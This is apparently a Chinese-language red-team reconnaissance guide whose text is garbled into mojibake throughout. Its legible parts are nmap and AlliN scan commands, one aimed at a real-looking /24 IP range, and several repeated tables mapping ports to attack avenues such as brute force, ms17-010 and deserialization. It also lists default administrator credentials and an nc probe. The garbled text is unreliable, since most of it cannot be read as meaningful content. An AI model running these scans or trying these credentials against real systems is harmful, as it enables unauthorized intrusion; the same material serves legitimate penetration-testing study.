çº¢é˜Ÿä¿¡æ¯æœé›†å·¥å…·ï¼Œè¢«åŠ¨è¯†åˆ«è®¿é—®ç«™ç‚¹æ˜¯å¦æ˜¯äº‘ä¸Šç«™ç‚¹ python3 AlliN.py --host 110.242.68.0/24 -p 80 -m pscan Ehole é¡¹ç›®åœ°å€ï¼šhttps://github.com/EdgeSecurityTeam/EHole EHoleæ˜¯ä¸€æ¬¾å¯¹èµ„äº§ä¸­é‡ç‚¹ç³»ç»ŸæŒ‡çº¹è¯†åˆ«çš„å·¥å…·ï¼Œåœ¨çº¢é˜Ÿä½œæˆ˜ä¸­ï¼Œä¿¡æ¯æ”¶é›†æ˜¯å¿…ä¸å¯å°‘çš„ç¯èŠ‚ï¼Œå¦‚ä½•æ‰èƒ½ä»å¤§é‡çš„èµ„äº§ä¸­æå–æœ‰ç”¨çš„ç³»ç»Ÿ(å¦‚OAã€VPNã€Weblogicâ€¦)ã€‚EHoleæ—¨åœ¨å¸®åŠ©çº¢é˜Ÿäººå‘˜åœ¨ä¿¡æ¯æ”¶é›†æœŸé—´èƒ½å¤Ÿå¿«é€Ÿä»Cæ®µã€å¤§é‡æ‚ä¹±çš„èµ„äº§ä¸­ç²¾å‡†å®šä½åˆ°æ˜“è¢«æ”»å‡»çš„ç³»ç»Ÿï¼Œä»è€Œå®æ–½è¿›ä¸€æ­¥æ”»å‡»ã€‚ å¼€æ”¾ç«¯å£æ¢æµ‹ æ”¶é›†åˆ°å¤§é‡IPï¼Œé‚£å°±è¦è¿›è¡Œç«¯å£æ‰«æäº†ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆå¸¸è§çš„æ¼æ´ã€‚ æœ€å¸¸ç”¨çš„å°±æ˜¯ç¥å™¨Nmapäº†ã€‚å‘½ä»¤ï¼šnmap -T4 -sT -p -sV ip -sS (TCP SYNæ‰«æ) -sT (TCP connect()æ‰«æ) -sU (UDPæ‰«æ) -sN; -sF; -sX (TCP Nullï¼ŒFINï¼Œand Xmasæ‰«æ) -Pn (ä¸é€šè¿‡ICMPæ¢æµ‹) è¯¦ç»†æ–‡æ¡£ï¼š https://nmap.org/man/zh/ å…¶æ¬¡å¯èƒ½è¿˜ä¼šç”¨åˆ° masscanï¼Œå¸¸è§ç«¯å£åŠå¯¹åº”æœåŠ¡è¡¨ï¼š ç«¯å£ æœåŠ¡ æ¸—é€ç”¨é€” tcp 20,21 FTP å…è®¸åŒ¿åçš„ä¸Šä¼ ä¸‹è½½,çˆ†ç ´,å—…æ¢,winææƒ,è¿œç¨‹æ‰§è¡Œ(proftpd 1.3.5),å„ç±»åé—¨(proftpd,vsftp 2.3.4) tcp 22 SSH å¯æ ¹æ®å·²æœé›†åˆ°çš„ä¿¡æ¯å°è¯•çˆ†ç ´,v1ç‰ˆæœ¬å¯ä¸­é—´äºº,sshéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘,æ–‡ä»¶ä¼ è¾“ç­‰ç­‰ tcp 23 Telnet çˆ†ç ´,å—…æ¢,ä¸€èˆ¬å¸¸ç”¨äºè·¯ç”±,äº¤æ¢ç™»é™†,å¯å°è¯•å¼±å£ä»¤ tcp 25 SMTP é‚®ä»¶ä¼ªé€ ,vrfy/expnæŸ¥è¯¢é‚®ä»¶ç”¨æˆ·ä¿¡æ¯,å¯ä½¿ç”¨smtp-user-enumå·¥å…·æ¥è‡ªåŠ¨è·‘ tcp/udp 53 DNS å…è®¸åŒºåŸŸä¼ é€,dnsåŠ«æŒ,ç¼“å­˜æŠ•æ¯’,æ¬ºéª—ä»¥åŠå„ç§åŸºäºdnséš§é“çš„è¿œæ§ tcp/udp 69 TFTP å°è¯•ä¸‹è½½ç›®æ ‡åŠå…¶çš„å„ç±»é‡è¦é…ç½®æ–‡ä»¶ tcp 80-89,443,8440-8450,8080-8089 å„ç§å¸¸ç”¨çš„WebæœåŠ¡ç«¯å£ å¯å°è¯•ç»å…¸çš„topn,vpn,owa,webmail,ç›®æ ‡oa,å„ç±»Javaæ§åˆ¶å°,å„ç±»æœåŠ¡å™¨Webç®¡ç†é¢æ¿,å„ç±»Webä¸­é—´ä»¶æ¼æ´åˆ©ç”¨,å„ç±»Webæ¡†æ¶æ¼æ´åˆ©ç”¨ç­‰ç­‰â€¦â€¦ tcp 110 POP3 å¯å°è¯•çˆ†ç ´,å—…æ¢ tcp 111,2049 NFS æƒé™é…ç½®ä¸å½“ tcp 137,139,445 Samba å¯å°è¯•çˆ†ç ´ä»¥åŠsmbè‡ªèº«çš„å„ç§è¿œç¨‹æ‰§è¡Œç±»æ¼æ´åˆ©ç”¨,å¦‚,ms08-067,ms17-010,å—…æ¢ç­‰â€¦â€¦ tcp 143 IMAP å¯å°è¯•çˆ†ç ´ udp 161 SNMP çˆ†ç ´é»˜è®¤å›¢é˜Ÿå­—ç¬¦ä¸²,æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯ tcp 389 LDAP ldapæ³¨å…¥,å…è®¸åŒ¿åè®¿é—®,å¼±å£ä»¤ tcp 512,513,514 Linux rexec å¯çˆ†ç ´,rloginç™»é™† tcp 873 Rsync åŒ¿åè®¿é—®,æ–‡ä»¶ä¸Šä¼  tcp 1194 OpenVPN æƒ³åŠæ³•é’“VPNè´¦å·,è¿›å†…ç½‘ tcp 1352 Lotus å¼±å£ä»¤,ä¿¡æ¯æ³„æ¼,çˆ†ç ´ tcp 1433 SQL Server æ³¨å…¥,ææƒ,saå¼±å£ä»¤,çˆ†ç ´ tcp 1521 Oracle tnsçˆ†ç ´,æ³¨å…¥,å¼¹shellâ€¦ tcp 1500 ISPmanager å¼±å£ä»¤ tcp 1723 PPTP çˆ†ç ´,æƒ³åŠæ³•é’“VPNè´¦å·,è¿›å†…ç½‘ tcp 2082,2083 cPanel å¼±å£ä»¤ tcp 2181 ZooKeeper æœªæˆæƒè®¿é—® tcp 2601,2604 Zebra é»˜è®¤å¯†ç zerbra tcp 3128 Squid å¼±å£ä»¤ tcp 3312,3311 kangle å¼±å£ä»¤ tcp 3306 MySQL æ³¨å…¥,ææƒ,çˆ†ç ´ tcp 3389 Windows rdp shiftåé—¨[éœ€è¦03ä»¥ä¸‹çš„ç³»ç»Ÿ],çˆ†ç ´,ms12-020 tcp 3690 SVN svnæ³„éœ²,æœªæˆæƒè®¿é—® tcp 4848 GlassFish å¼±å£ä»¤ tcp 5000 Sybase/DB2 çˆ†ç ´,æ³¨å…¥ tcp 5432 PostgreSQL çˆ†ç ´,æ³¨å…¥,å¼±å£ä»¤ tcp 5900,5901,5902 VNC å¼±å£ä»¤çˆ†ç ´ tcp 5984 CouchDB æœªæˆæƒå¯¼è‡´çš„ä»»æ„æŒ‡ä»¤æ‰§è¡Œ tcp 6379 Redis å¯å°è¯•æœªæˆæƒè®¿é—®,å¼±å£ä»¤çˆ†ç ´ tcp 7001,7002 WebLogic Javaååºåˆ—åŒ–,å¼±å£ä»¤ tcp 7778 Kloxo ä¸»æœºé¢æ¿ç™»å½• tcp 8000 Ajenti å¼±å£ä»¤ tcp 8443 Plesk å¼±å£ä»¤ tcp 8069 Zabbix è¿œç¨‹æ‰§è¡Œ,SQLæ³¨å…¥ tcp 8080-8089 Jenkins,JBoss ååºåˆ—åŒ–,æ§åˆ¶å°å¼±å£ä»¤ tcp 9080-9081,9090 WebSphere Javaååºåˆ—åŒ–/å¼±å£ä»¤ tcp 9200,9300 ElasticSearch è¿œç¨‹æ‰§è¡Œ tcp 11211 Memcached æœªæˆæƒè®¿é—® tcp 27017,27018 MongoDB çˆ†ç ´,æœªæˆæƒè®¿é—® tcp 50070,50030 Hadoop é»˜è®¤ç«¯å£æœªæˆæƒè®¿é—® ç«¯å£å· ç«¯å£è¯´æ˜ æ¸—é€æ€è·¯ 21/69 FTP/TFTPï¼šæ–‡ä»¶ä¼ è¾“åè®® çˆ†ç ´ã€å†…ç½‘å—…æ¢ 22 SSHï¼šè¿œç¨‹è¿æ¥ ç”¨æˆ·åæšä¸¾ã€çˆ†ç ´ 23 Telnetï¼šè¿œç¨‹è¿æ¥ çˆ†ç ´ã€å†…ç½‘å—…æ¢ 25 SMTPï¼šé‚®ä»¶æœåŠ¡ é‚®ä»¶ä¼ªé€  53 DNSï¼šåŸŸåç³»ç»Ÿ DNSåŸŸä¼ é€\\DNSç¼“å­˜æŠ•æ¯’\\DNSæ¬ºéª—\\åˆ©ç”¨DNSéš§é“æŠ€æœ¯åˆºé€é˜²ç«å¢™ 389 LDAP æœªæˆæƒè®¿é—®ï¼ˆé€šè¿‡LdapBrowserå·¥å…·ç›´æ¥è¿å…¥ï¼‰ 443 httpsæœåŠ¡ OpenSSL å¿ƒè„æ»´è¡€ï¼ˆnmap -sV --script=ssl-heartbleed ç›®æ ‡ï¼‰ 445 SMBæœåŠ¡ ms17_010è¿œç¨‹ä»£ç æ‰§è¡Œ 873 rsyncæœåŠ¡ æœªæˆæƒè®¿é—® 1090/1099 Java-rmi JAVAååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 1352 Lotus Dominoé‚®ä»¶æœåŠ¡ çˆ†ç ´ï¼šå¼±å£ä»¤ã€ä¿¡æ¯æ³„æ¼ï¼šæºä»£ç  1433 MSSQL æ³¨å…¥ã€SAå¼±å£ä»¤çˆ†ç ´ã€ææƒ 1521 Oracle æ³¨å…¥ã€TNSçˆ†ç ´ 2049 NFS é…ç½®ä¸å½“ 2181 ZooKeeperæœåŠ¡ æœªæˆæƒè®¿é—® 3306 MySQL æ³¨å…¥ã€çˆ†ç ´ã€å†™shellã€ææƒ 3389 RDP çˆ†ç ´ã€Shiftåé—¨ã€CVE-2019-0708è¿œç¨‹ä»£ç æ‰§è¡Œ 4848 GlassFishæ§åˆ¶å° çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 5000 Sybase/DB2æ•°æ®åº“ çˆ†ç ´ã€æ³¨å…¥ 5432 PostgreSQL çˆ†ç ´å¼±å£ä»¤ã€é«˜æƒé™æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 5632 PcAnywhereæœåŠ¡ çˆ†ç ´å¼±å£ä»¤ 5900 VNC çˆ†ç ´ï¼šå¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 6379 Redis æœªæˆæƒè®¿é—®ã€çˆ†ç ´å¼±å£ä»¤ 7001 WebLogicä¸­é—´ä»¶ ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤+éƒ¨ç½²waråŒ…ã€SSRF 8000 jdwp JDWP è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆå·¥å…·ï¼‰ 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ã€æœªæˆæƒ 8161 ActiveMQ admin/adminã€ä»»æ„æ–‡ä»¶å†™å…¥ã€ååºåˆ—åŒ– 8069 Zabbix è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 9043 WebSphereæ§åˆ¶å° æ§åˆ¶å°å¼±å£ä»¤https://:9043/ibm/console/logon.jspã€è¿œç¨‹ä»£ç æ‰§è¡Œ 9200/9300 ElasticsearchæœåŠ¡ è¿œç¨‹ä»£ç æ‰§è¡Œ 11211 Memcache æœªæˆæƒè®¿é—®ï¼ˆnc -vv ç›®æ ‡ 11211ï¼‰ 27017 MongoDB æœªæˆæƒè®¿é—®ã€çˆ†ç ´å¼±å£ä»¤ 50000 SAP è¿œç¨‹ä»£ç æ‰§è¡Œ 50070 hadoop æœªæˆæƒè®¿é—® ç«¯å£å· æœåŠ¡ æ¸—é€æ€è·¯ 21 FTP/TFTP/VSFTPD çˆ†ç ´/å—…æ¢/æº¢å‡º/åé—¨ 22 sshè¿œç¨‹è¿æ¥ çˆ†ç ´/opensshæ¼æ´ 23 Telnetè¿œç¨‹è¿æ¥ çˆ†ç ´/å—…æ¢/å¼±å£ä»¤ 25 SMTPé‚®ä»¶æœåŠ¡ é‚®ä»¶ä¼ªé€  53 DNSåŸŸåè§£æç³»ç»Ÿ åŸŸä¼ é€/åŠ«æŒ/ç¼“å­˜æŠ•æ¯’/æ¬ºéª— 67/68 dhcpæœåŠ¡ åŠ«æŒ/æ¬ºéª— 110 pop3 çˆ†ç ´/å—…æ¢ 139 SambaæœåŠ¡ çˆ†ç ´/æœªæˆæƒè®¿é—®/è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 143 Imapåè®® çˆ†ç ´161SNMPåè®®çˆ†ç ´/æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯ 389 Ldapç›®å½•è®¿é—®åè®® æ³¨å…¥/æœªæˆæƒè®¿é—®/å¼±å£ä»¤ 445 smb ms17-010/ç«¯å£æº¢å‡º 512/513/514 Linux RexecæœåŠ¡ çˆ†ç ´/Rloginç™»é™† 873 RsyncæœåŠ¡ æ–‡ä»¶ä¸Šä¼ /æœªæˆæƒè®¿é—® 1080 socket çˆ†ç ´ 1352 Lotus dominoé‚®ä»¶æœåŠ¡ çˆ†ç ´/ä¿¡æ¯æ³„æ¼ 1433 mssql çˆ†ç ´/æ³¨å…¥/SAå¼±å£ä»¤ 1521 oracle çˆ†ç ´/æ³¨å…¥/TNSçˆ†ç ´/åå¼¹shell2049NfsæœåŠ¡é…ç½®ä¸å½“ 2181 zookeeperæœåŠ¡ æœªæˆæƒè®¿é—® 2375 docker remote api æœªæˆæƒè®¿é—® 3306 mysql çˆ†ç ´/æ³¨å…¥ 3389 Rdpè¿œç¨‹æ¡Œé¢é“¾æ¥ çˆ†ç ´/shiftåé—¨ 4848 GlassFishæ§åˆ¶å° çˆ†ç ´/è®¤è¯ç»•è¿‡ 5000 sybase/DB2æ•°æ®åº“ çˆ†ç ´/æ³¨å…¥/ææƒ 5432 postgresql çˆ†ç ´/æ³¨å…¥/ç¼“å†²åŒºæº¢å‡º 5632 pcanywhereæœåŠ¡ æŠ“å¯†ç /ä»£ç æ‰§è¡Œ 5900 vnc çˆ†ç ´/è®¤è¯ç»•è¿‡ 6379 Redisæ•°æ®åº“ æœªæˆæƒè®¿é—®/çˆ†ç ´ 7001/7002 weblogic javaååºåˆ—åŒ–/æ§åˆ¶å°å¼±å£ä»¤ 80/443 http/https webåº”ç”¨æ¼æ´/å¿ƒè„æ»´è¡€ 8069 zabbixæœåŠ¡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ/æ³¨å…¥ 8161 activemq å¼±å£ä»¤/å†™æ–‡ä»¶ 8080/8089 Jboss/Tomcat/Resin çˆ†ç ´/PUTæ–‡ä»¶ä¸Šä¼ /ååºåˆ—åŒ– 8083/8086 influxDB æœªæˆæƒè®¿é—® 9000 fastcgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 9090 Websphere æ§åˆ¶å°çˆ†ç ´/javaååºåˆ—åŒ–/å¼±å£ä»¤ 9200/9300 elasticsearch è¿œç¨‹ä»£ç æ‰§è¡Œ 11211 memcached æœªæˆæƒè®¿é—® 27017/27018 mongodb æœªæˆæƒè®¿é—®/çˆ†ç ´ ç«¯å£å· æœåŠ¡ æ¸—é€æ€è·¯ 20 ftp_data çˆ†ç ´ã€å—…æ¢ã€æº¢å‡ºã€åé—¨ 21 ftp_control çˆ†ç ´ã€å—…æ¢ã€æº¢å‡ºã€åé—¨ 23 telnet çˆ†ç ´ã€å—…æ¢ 25 smtp é‚®ä»¶ä¼ªé€  53 DNS DNSåŒºåŸŸä¼ è¾“ã€DNSåŠ«æŒã€DNSç¼“å­˜æŠ•æ¯’ã€DNSæ¬ºéª—ã€æ·±åº¦åˆ©ç”¨ï¼šåˆ©ç”¨DNSéš§é“æŠ€æœ¯åˆºé€é˜²ç«å¢™ 67 dhcp åŠ«æŒã€æ¬ºéª— 68 dhcp åŠ«æŒã€æ¬ºéª— 110 pop3 çˆ†ç ´ 139 samba çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ 143 imap çˆ†ç ´ 161 snmp çˆ†ç ´ 389 ldap æ³¨å…¥æ”»å‡»ã€æœªæˆæƒè®¿é—® 512 linux r ç›´æ¥ä½¿ç”¨rlogin 513 linux r ç›´æ¥ä½¿ç”¨rlogin 514 linux r ç›´æ¥ä½¿ç”¨rlogin 873 rsync æœªæˆæƒè®¿é—® 888 BTLINUX å®å¡”Linuxä¸»æœºç®¡ç†åå°/é»˜è®¤å¸æˆ·ï¼šadminï½œé»˜è®¤å¯†ç ï¼šadmin 999 PMA æŠ¤å«ç¥ä½©å¸¦çš„phpmyadminç®¡ç†åå°ï¼Œé»˜è®¤å¸æˆ·ï¼šrootï½œé»˜è®¤å¯†ç ï¼šhuweishen.com 1080 socket çˆ†ç ´ï¼šè¿›è¡Œå†…ç½‘æ¸—é€ 1352 lotus çˆ†ç ´ï¼šå¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ï¼šæºä»£ç  1433 mssql çˆ†ç ´ï¼šä½¿ç”¨ç³»ç»Ÿç”¨æˆ·ç™»å½•ã€æ³¨å…¥æ”»å‡» 1521 oracle çˆ†ç ´ï¼šTNSã€æ³¨å…¥æ”»å‡» 2049 nfs é…ç½®ä¸å½“ 2181 zookeeper æœªæˆæƒè®¿é—® 3306 mysql çˆ†ç ´ã€æ‹’ç»æœåŠ¡ã€æ³¨å…¥ 3389 rdp çˆ†ç ´ã€Shiftåé—¨ 4848 glassfish çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 5000 sybase/DB2 çˆ†ç ´ã€æ³¨å…¥ 5432 postgresql ç¼“å†²åŒºæº¢å‡ºã€æ³¨å…¥æ”»å‡»ã€çˆ†ç ´ï¼šå¼±å£ä»¤ 5632 pcanywhere æ‹’ç»æœåŠ¡ã€ä»£ç æ‰§è¡Œ 5900 vnc çˆ†ç ´ï¼šå¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 5901 vnc çˆ†ç ´ï¼šå¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 5902 vnc çˆ†ç ´ï¼šå¼±å£ä»¤ã€è®¤è¯ç»•è¿‡ 6379 redis æœªæˆæƒè®¿é—®ã€çˆ†ç ´ï¼šå¼±å£ä»¤ 7001 weblogic JAVAååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ã€æ§åˆ¶å°éƒ¨ç½²webshell 7002 weblogic JAVAååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ã€æ§åˆ¶å°éƒ¨ç½²webshell 80 web å¸¸è§Webæ”»å‡»ã€æ§åˆ¶å°çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ 443 web å¸¸è§Webæ”»å‡»ã€æ§åˆ¶å°çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ 8080 webï½œTomcatï½œâ€¦ å¸¸è§Webæ”»å‡»ã€æ§åˆ¶å°çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ã€Tomcatæ¼æ´ 8069 zabbix è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 9090 websphere æ–‡ä»¶æ³„éœ²ã€çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤ã€Javaååºåˆ— 9200 elasticsearch æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ 9300 elasticsearch æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ 11211 memcacache æœªæˆæƒè®¿é—® 27017 mongodb çˆ†ç ´ã€æœªæˆæƒè®¿é—® 27018 mongodb çˆ†ç ´ã€æœªæˆæƒè®¿é—® 50070 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 50075 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 14000 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 8480 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 8088 web çˆ†ç ´ã€æœªæˆæƒè®¿é—® 50030 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 50060 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 60010 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 60030 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 10000 Virtualmin/Webmin æœåŠ¡å™¨è™šæ‹Ÿä¸»æœºç®¡ç†ç³»ç»Ÿ 10003 Hadoop çˆ†ç ´ã€æœªæˆæƒè®¿é—® 5984 couchdb æœªæˆæƒè®¿é—® 445 SMB å¼±å£ä»¤çˆ†ç ´ï¼Œæ£€æµ‹æ˜¯å¦æœ‰ms_08067ç­‰æº¢å‡º 1025 111 NFS 2082 cpanelä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† ï¼ˆå›½å¤–ç”¨è¾ƒå¤šï¼‰ 2083 cpanelä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† ï¼ˆå›½å¤–ç”¨è¾ƒå¤šï¼‰ 2222 DAè™šæ‹Ÿä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† ï¼ˆå›½å¤–ç”¨è¾ƒå¤šï¼‰ 2601 zebraè·¯ç”± 2604 zebraè·¯ç”± 3128 ä»£ç†é»˜è®¤ç«¯å£,å¦‚æœæ²¡è®¾ç½®å£ä»¤å¾ˆå¯èƒ½å°±ç›´æ¥æ¼«æ¸¸å†…ç½‘äº† 3311 kangleä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† 3312 kangleä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† 4440 å‚è€ƒWooYun: å€Ÿç”¨æ–°æµªæŸæœåŠ¡æˆåŠŸæ¼«æ¸¸æ–°æµªå†…ç½‘ 6082 å‚è€ƒWooYun: Varnish HTTP accelerator CLI æœªæˆæƒè®¿é—®æ˜“å¯¼è‡´ç½‘ç«™è¢«ç›´æ¥ç¯¡æ”¹æˆ–è€…ä½œä¸ºä»£ç†è¿›å…¥å†…ç½‘ 7778 ä¸»æœºæ§åˆ¶é¢æ¿ç™»å½• 8083 ä¸»æœºç®¡ç†ç³»ç»Ÿ ï¼ˆå›½å¤–ç”¨è¾ƒå¤šï¼‰ 8649 8888 ä¸»æœºç®¡ç†ç³»ç»Ÿé»˜è®¤ç«¯å£ 9000 fcgi phpæ‰§è¡Œ 50000 SAP å‘½ä»¤æ‰§è¡Œ ç½‘ç»œæ¶æ„æ¢æµ‹ å½“æˆ‘ä»¬æ¢æµ‹ç›®æ ‡ç«™ç‚¹ç½‘ç«™æ¶æ„æ—¶ï¼Œæ¯”å¦‚è¯´ï¼šæ“ä½œç³»ç»Ÿï¼Œä¸­é—´ä»¶ï¼Œè„šæœ¬è¯­è¨€ï¼Œæ•°æ®åº“ï¼ŒæœåŠ¡å™¨ï¼Œwebå®¹å™¨ç­‰ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æŸ¥è¯¢ã€‚ CMSè¯†åˆ« è¯†åˆ« CMS çš„ç›®çš„åœ¨äºï¼Œæ–¹ä¾¿åˆ©ç”¨å·²å…¬å¼€æ¼æ´è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç”šè‡³å¯ä»¥åˆ°å¯¹åº” CMS çš„å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ CMS è¿›è¡Œæœ¬åœ°ç™½ç›’ä»£ç å®¡è®¡ã€‚ ï¼ˆ1ï¼‰wappalyzeræ’ä»¶â€”â€”ç«ç‹æ’ä»¶ ï¼ˆ2ï¼‰äº‘æ‚‰ï¼šhttp://www.yunsee.cn/ â€”ä¸è¿‡è¿™ä¸ªé‚€è¯·ç æœ‰ç‚¹ã€‚ã€‚ã€‚ã€‚ ï¼ˆ3ï¼‰CMSæŒ‡çº¹è¯†åˆ«ï¼šhttp://whatweb.bugscaner.com/look/ â€”â€”ä½†è¿™ä¸ªä¼¼ä¹ä¸èƒ½ç”¨äº† CMSæŒ‡çº¹è¯†åˆ«åˆæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚è¯´å¾¡å‰‘æŒ‡çº¹è¯†åˆ«ã€Webrobotå·¥å…·ã€whatwebå·¥å…·ã€è¿˜æœ‰åœ¨çº¿æŸ¥è¯¢çš„ç½‘ç«™ç­‰ç­‰ã€‚ æœåŠ¡å™¨ä¿¡æ¯æœé›† æœåŠ¡ç‰ˆæœ¬è¯†åˆ«ã€æ“ä½œç³»ç»Ÿä¿¡æ¯è¯†åˆ«éƒ½å¯ä»¥åˆ©ç”¨ nmap å®ç°è¯†åˆ« nmap -sV -p 1-65535 x.x.x.xnmap -O x.x.x.x ç‰¹å®šå…³é”®å­—è¯†åˆ« CMS çš„é¦–é¡µæ–‡ä»¶ã€ç‰¹å®šæ–‡ä»¶å¯èƒ½åŒ…å«äº† CMS ç±»å‹åŠç‰ˆæœ¬ä¿¡æ¯ï¼Œé€šè¿‡è®¿é—®è¿™äº›æ–‡ä»¶ï¼Œå°†è¿”å›çš„ç½‘é¡µä¿¡æ¯ï¼ˆå¦‚ Powered by XXCMSï¼‰ä¸æ‰«æå·¥å…·æ•°æ®åº“å­˜å‚¨çš„æŒ‡çº¹ä¿¡æ¯è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œåˆ¤æ–­ CMS çš„ç±»å‹ã€‚ ä¹Ÿå¯èƒ½å‰ç«¯æºç ä¸­æˆ– meta æ ‡ç­¾ä¸­çš„ content å­—æ®µå­˜åœ¨ä¸€äº› CMS ç‰¹å¾ä¿¡æ¯ï¼Œä¸‹å›¾å¾ˆæ˜æ˜¾èƒ½å¾—çŸ¥æ˜¯ WordPress æ¡†æ¶ ç‰¹å®šæ–‡ä»¶åŠè·¯å¾„è¯†åˆ« ä¸åŒçš„ CMS ä¼šæœ‰ä¸åŒçš„ç½‘ç«™ç»“æ„åŠæ–‡ä»¶åç§°ï¼Œå¯ä»¥é€šè¿‡ç‰¹å®šæ–‡ä»¶åŠè·¯å¾„è¯†åˆ« CMSã€‚å¦‚ WordPress ä¼šæœ‰ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ /wp-adminã€/wp-includes ç­‰ï¼Œæœ‰äº› CMS çš„ robots.txt æ–‡ä»¶ä¹Ÿå¯èƒ½åŒ…å«äº† CMS ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œä¸æ‰«æå·¥å…·æ•°æ®åº“å­˜å‚¨çš„æŒ‡çº¹ä¿¡æ¯è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œåˆ¤æ–­ CMS çš„ç±»å‹ã€‚ CMS ä¼šæœ‰ä¸€äº› JSã€CSSã€å›¾ç‰‡ç­‰é™æ€æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸€èˆ¬ä¸ä¼šå˜åŒ–ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›ç‰¹å®šæ–‡ä»¶çš„ MD5 å€¼ä½œä¸ºæŒ‡çº¹ä¿¡æ¯æ¥åˆ¤æ–­ CMS çš„ç±»å‹ã€‚ å“åº”å¤´ä¿¡æ¯è¯†åˆ« åº”ç”¨ç¨‹åºä¼šåœ¨å“åº”å¤´ Serverã€X-Powered-Byã€Set-Cookie ç­‰å­—æ®µä¸­è¿”å› Banner ä¿¡æ¯æˆ–è€…è‡ªå®šä¹‰çš„æ•°æ®å­—æ®µï¼Œé€šè¿‡å“åº”å¤´è¿”å›çš„ä¿¡æ¯ï¼Œå¯ä»¥å¯¹åº”ç”¨è¿›è¡Œè¯†åˆ«ï¼Œæœ‰äº› WAF è®¾å¤‡ä¹Ÿå¯ä»¥é€šè¿‡å“åº”å¤´ä¿¡æ¯è¿›è¡Œè¯†åˆ«åˆ¤æ–­ã€‚å½“ç„¶ Banner ä¿¡æ¯å¹¶ä¸ä¸€å®šæ˜¯å®Œå…¨å‡†ç¡®çš„ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥è‡ªå®šä¹‰è‡ªå·±çš„ Banner ä¿¡æ¯ã€‚ ä¾‹å¦‚ Shiro çš„å“åº”å¤´ä¿¡æ¯ä¸­åŒ…å« rememberMe å­—æ®µï¼š å¸¸è§è„šæœ¬å·¥å…· é¡¹ç›®åœ°å€ï¼šhttps://github.com/s7ckTeam/Glass Glassæ˜¯ä¸€æ¬¾é’ˆå¯¹èµ„äº§åˆ—è¡¨çš„å¿«é€ŸæŒ‡çº¹è¯†åˆ«å·¥å…·ï¼Œé€šè¿‡è°ƒç”¨Fofa/ZoomEye/Shodan/360ç­‰apiæ¥å£å¿«é€ŸæŸ¥è¯¢èµ„äº§ä¿¡æ¯å¹¶è¯†åˆ«é‡ç‚¹èµ„äº§çš„æŒ‡çº¹ï¼Œä¹Ÿå¯é’ˆå¯¹IP/IPæ®µæˆ–èµ„äº§åˆ—è¡¨è¿›è¡Œå¿«é€Ÿçš„æŒ‡çº¹è¯†åˆ«ã€‚ Glassæ—¨åœ¨å¸®åŠ©çº¢é˜Ÿäººå‘˜åœ¨èµ„äº§ä¿¡æ¯æ”¶é›†æœŸé—´èƒ½å¤Ÿå¿«é€Ÿä»Cæ®µã€å¤§é‡æ‚ä¹±çš„èµ„äº§ä¸­ç²¾å‡†è¯†åˆ«åˆ°æ˜“è¢«æ”»å‡»çš„ç³»ç»Ÿï¼Œä»è€Œå®æ–½è¿›ä¸€æ­¥æµ‹è¯•æ”»å‡»ã€‚ è¿˜æœ‰ä¸¤æ¬¾åªæ”¯æŒå¦‚ WordPress, Joomla, Drupal çš„å·¥å…· 